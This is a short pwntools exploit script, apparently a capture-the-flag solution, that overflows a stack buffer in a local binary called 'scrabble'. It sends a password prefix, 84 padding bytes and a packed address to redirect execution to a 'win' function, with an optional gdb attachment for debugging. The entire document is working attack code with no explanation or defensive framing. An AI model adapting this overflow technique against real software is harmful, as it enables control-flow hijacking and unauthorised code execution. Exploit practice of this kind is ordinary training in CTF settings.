from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./scrabble")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    gdb.attach(p, """
              set disassembly-flavor intel
               b main
               """)

win_addr = 0x400f8f

p.recvuntil("? ")
p.sendline("1")
p.recvuntil(": ")
p.sendline('pass' + 'A'*84 + p64(win_addr))

p.interactive()